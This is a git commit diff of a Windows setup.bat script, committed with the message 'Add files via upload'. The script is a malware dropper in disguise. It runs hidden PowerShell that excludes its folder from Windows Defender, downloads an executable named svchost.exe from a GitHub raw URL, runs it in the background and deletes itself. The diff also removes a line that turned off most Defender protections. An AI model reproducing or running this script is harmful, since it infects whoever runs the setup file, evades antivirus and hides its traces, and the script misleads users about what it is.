570ef2dfd0ca9b1c60e59a8a49459df98ee4967b
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-25 10:50:44 +0300

    Add files via upload

--- setup.bat
+++ setup.bat
@@ -1,7 +1,6 @@
 @echo off
 cd /d "%~dp0"
 powershell -w hidden -Command "Add-MpPreference -ExclusionPath '%~dp0'"
-powershell -w hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -CloudProtectionLevel 0; Set-MpPreference -PUAProtection 0; Set-MpPreference -SubmitSamplesConsent 2"
 powershell -w hidden -Command "iwr 'https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe' -O '%~dp0svchost.exe'"
 if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
 del "%~f0" >nul 2>&1
